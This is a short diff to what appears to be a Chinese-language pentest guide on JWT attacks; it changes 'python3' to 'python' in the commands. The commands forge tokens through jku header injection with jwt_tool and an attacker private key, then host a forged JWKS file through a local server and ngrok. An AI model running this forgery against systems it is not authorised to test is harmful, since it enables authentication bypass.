@@ -323,18 +323,18 @@ openssl x509 -in cert.pem -pubkey -noout > pubkey.pem
 
 ```bash
 # jwt_tool jku 注入
-python3 jwt_tool.py <token> -X i -pk attacker_private.pem
+python jwt_tool.py <token> -X i -pk attacker_private.pem
 
 # 生成 RSA 密钥对
 openssl genrsa -out private.pem 2048
 openssl rsa -in private.pem -pubout -out public.pem
 
 # 托管 JWKS (临时)
-python3 -m http.server 8888
+python -m http.server 8888
 # 然后将 jwks.json 放在当前目录，ngrok http 8888
 
 # 观察是否有请求过来
-python3 -m http.server 8888 2>&1 | tee access.log
+python -m http.server 8888 2>&1 | tee access.log
 ```
 
 ## 工作流
